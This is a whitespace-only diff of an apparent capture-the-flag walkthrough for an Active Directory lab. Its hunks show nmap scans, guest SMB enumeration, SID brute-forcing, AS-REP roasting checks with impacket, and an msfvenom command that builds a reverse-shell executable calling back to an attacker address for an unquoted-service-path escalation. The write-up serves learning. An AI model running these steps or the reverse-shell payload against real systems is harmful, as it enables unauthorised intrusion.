@@ -61,7 +61,7 @@ Nmap done: 1 IP address (1 host up) scanned in 28.36 seconds
 That's lots of info. Before that let's add the Domain name and Computer Name in our hosts file.
 
 ```bash
-kali@kali:cat /etc/hosts                                                                                                                        
+kali@kali:cat /etc/hosts
 10.48.183.111   LAB-DC.LAB.ENTERPRISE.THM LAB.ENTERPRISE.THM
 
 127.0.0.1       localhost
@@ -78,17 +78,17 @@ I tried some enumeration on the website on port 80, but it was a dead end.
 Since, there is smb server. Let's see if we have guest logon allowed.
 
 ```bash
-kali@kali:smbclient -L \\10.48.183.111                                                                                                          
+kali@kali:smbclient -L \\10.48.183.111
 Password for [WORKGROUP\kali]:
 
         Sharename       Type      Comment
         ---------       ----      -------
         ADMIN$          Disk      Remote Admin
         C$              Disk      Default share
-        Docs            Disk      
+        Docs            Disk
         IPC$            IPC       Remote IPC
-        NETLOGON        Disk      Logon server share 
-        SYSVOL          Disk      Logon server share 
+        NETLOGON        Disk      Logon server share
+        SYSVOL          Disk      Logon server share
         Users           Disk      Users Share. Do Not Touch!
 Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.48.183.111 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
@@ -98,7 +98,7 @@ Unable to connect with SMB1 -- no workgroup available
 Ok. We have guest logon allowed. Let's see what do we have in Users share. 
 
 ```bash
-kali@kali:smbclient \\\\10.48.183.111\\Users                                                                                                    
+kali@kali:smbclient \\\\10.48.183.111\\Users
 Password for [WORKGROUP\kali]:
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -127,8 +127,8 @@ It was just a decoy to lure us. Nothing can be done from here.
 Since, we have guest logon. Let's try to bruteforce the Users in the domain.
 
 ```bash
-kali@kali:impacket-lookupsid guest@10.48.183.111                                                                                                
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+kali@kali:impacket-lookupsid guest@10.48.183.111
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 Password:
 [*] Brute forcing SIDs at 10.48.183.111
@@ -190,8 +190,8 @@ joiner
 Let's see if any of the users have No_preauth set.
 
 ```bash
-kali@kali:impacket-GetNPUsers lab.enterprise.thm/ -usersfile user.txt -no-pass -dc-ip 10.48.183.111                                             
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+kali@kali:impacket-GetNPUsers lab.enterprise.thm/ -usersfile user.txt -no-pass -dc-ip 10.48.183.111
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [-] User atlbitbucket doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] User bitbucket doesn't have UF_DONT_REQUIRE_PREAUTH set
@@ -233,24 +233,24 @@ PORT      STATE SERVICE
 9389/tcp  open  adws
 47001/tcp open  winrm
 49664/tcp open  unknown
-49665/tcp open  unknown                                                                                                                   
-49666/tcp open  unknown                                                                                                                   
-49669/tcp open  unknown                                                                                                                   
-49670/tcp open  unknown                                                                                                                   
-49671/tcp open  unknown                                                                                                                   
-49673/tcp open  unknown                                                                                                                   
-49677/tcp open  unknown                                                                                                                   
-49700/tcp open  unknown                                                                                                                   
-49704/tcp open  unknown                                                                                                                   
-49879/tcp open  unknown                                                                                                                   
-                                                                                                                                          
+49665/tcp open  unknown
+49666/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+49671/tcp open  unknown
+49673/tcp open  unknown
+49677/tcp open  unknown
+49700/tcp open  unknown
+49704/tcp open  unknown
+49879/tcp open  unknown
+
 Nmap done: 1 IP address (1 host up) scanned in 69.06 seconds
 ```
 
 Among all these scan, 7990 port stand out, as it was not found on previous scan, and it's service is unknow. Let's dive deeper.
 
 ```bash
-kali@kali:nmap -p 7990 -sV -sC  10.48.183.111                                                                                                   
+kali@kali:nmap -p 7990 -sV -sC  10.48.183.111
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-07 10:27 +0545
 Nmap scan report for LAB-DC.LAB.ENTERPRISE.THM (10.48.183.111)
 Host is up (0.051s latency).
@@ -454,9 +454,9 @@ Since, this directory has a write access, and it also suffers from Unquoted Serv
 Create a reverse shell executable with msfvenom.
 
 ```bash
-kali@kali:msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.130.26 LPORT=9001 -f exe -o Zero.exe                                         
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                                                   
-[-] No arch selected, selecting arch: x64 from the payload                                                                               
+kali@kali:msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.130.26 LPORT=9001 -f exe -o Zero.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
 Payload size: 460 bytes
 Final size of exe file: 7680 bytes
